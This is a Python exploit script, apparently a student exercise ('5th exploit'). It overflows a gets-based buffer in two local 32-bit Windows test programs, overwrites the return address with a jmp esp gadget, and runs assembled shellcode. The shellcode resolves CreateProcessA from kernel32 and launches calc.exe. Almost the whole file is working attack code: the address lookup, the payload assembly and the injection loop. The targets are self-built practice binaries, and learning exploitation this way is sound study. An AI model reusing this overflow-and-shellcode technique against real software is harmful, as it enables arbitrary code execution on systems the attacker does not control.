# 5th exploit: buffer overflow + jump to stack + open the calculator

import sys

from pwintools import *
import windows # from PythonForWindows package

def findModuleByName(process, name):
	ret = None
	for module in process.peb.modules:
		if name == module.name:
			ret = module
			break

	return ret

def findExportInModule(module, name):
	ret = None
	for export in module.pe.exports:
		# print(export)
		if name == export:
			ret = module.pe.exports[export]
	return ret


# for this exploit, the addresses in loaded KERNEL32.DLL are fetched in the py script

# didn't manage to spawn a process..
# cmd = windows.winproxy.CreateProcessA('C:/Windows/SysWOW64/cmd.exe', '/?')

# find any 32bit process
proc32 = None
for process in windows.system.processes:
	try: # discard weird exceptions
		if 32 == process.bitness and not process.token.TokenElevation.TokenIsElevated:
			proc32 = process
			break
	except:
		pass

if None == proc32:
	print('This script is weird, yes: it requires a 32bit program to be running')
	sys.exit()

kernel32_module = findModuleByName(proc32, 'kernel32.dll')

# should never happen
if None == kernel32_module:
	print('No kernel32.dll inside the process')
	sys.exit()

kernel_createprocessa = findExportInModule(kernel32_module, 'CreateProcessA')
print('CreateProcessA has address ' + hex(kernel_createprocessa))

# 64 bit has non-executable stack
processes = [
	Process('1_gets_gcc_32.exe'),
	Process('1_gets_vs_32.exe'),
]

retAddrOffs = [
	48,
	40,
]

# jmp esp
jmpEspAddr = [
	0x40171f,
	0x4070BA,
]

data = [
	0x401612,
	0x406FF3,
]

injection = asm(
	# allocate and fill a STARTUPINFOA structure
	'sub esp, 68;' # sizeof(STARTUPINFOA) in 32 bits

	# zero-initialize
	'mov edi, esp;'
	'mov ecx, 68;'
	'mov al, 0;'
	'rep stosb;'
	'mov ebx, esp;'

	#'mov [esp], dword 68;' # cb: size in byts
	'mov eax, 68;'
	'mov [esp], eax;'
	# idk what to put inside

	# allocate a PROCESS_INFORMATION structure
	'sub esp, 16;' # sizeof(PROCESS_INFORMATION)
	'mov esi, esp;'

	'xor ecx, ecx;'

	# CreateProcessA
	'push esi;' # lpProcessInformation
	'push ebx;' # lpStartupInfo
	'push ecx;' # lpCurrentDirectory
	'push ecx;' # lpEnvironment
	'push ecx;' # dwCreationFlags
	'push ecx;' # bInheritHandles
	'push ecx;' # lpThreadAttributes
	'push ecx;' # lpProcessAttributes
	'push ecx;' # lpCommandLine

	'call label123;' # lpApplicationName
	'.asciz "C:/WINDOWS/system32/calc.exe";'
	'label123:'

	'mov eax, ' + str(kernel_createprocessa) + ';'
	'call eax;'

	# TODO close handles? ([esi], [esi+4])

	'label456:',
	32
)

for b in injection:
	if 0x0d == b or 0x0a == b:
		print('Error: assembly contains ' + str(b))
		sys.exit()

for i in range(len(processes)):
	processes[i].recvuntil(b'name:\r\n')
	print(b'Injecting ' + injection)
	processes[i].sendline(b'a'*retAddrOffs[i] + p32(jmpEspAddr[i]) + injection) # + b'tmp' + str(i).encode('ascii') + b'\0')
	print(processes[i].recvall())
